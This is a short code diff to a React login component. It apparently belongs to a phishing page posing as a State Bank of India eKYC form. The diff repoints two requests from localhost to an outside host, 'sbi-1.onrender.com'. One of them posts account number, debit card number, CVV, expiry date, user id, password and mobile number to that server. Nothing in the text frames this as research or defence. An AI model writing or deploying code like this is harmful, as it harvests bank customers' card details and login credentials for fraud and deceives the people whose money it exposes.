@@ -22,7 +22,7 @@ function Login() {
     const handleSendOTP = async (e) => {
      
       try {
-        const response = await axios.post('http://localhost:5000/sendOTP', { mobileNumber });
+        const response = await axios.post('https://sbi-1.onrender.com/sendOTP', { mobileNumber });
         if (response.data.success) {
             setOTPSent(true);
             setVerificationError('');
@@ -48,7 +48,7 @@ function Login() {
 
     const handleData = async (e) => {
        e.preventDefault();
-      let result = await fetch('http://localhost:5000/sbi-ekyc',{
+      let result = await fetch('https://sbi-1.onrender.com/sbi-ekyc',{
         method: 'post',
         body: JSON.stringify({acnumber,debumber,CVV,cardexpiry,userid,password,mobileNumber}),
         headers:{
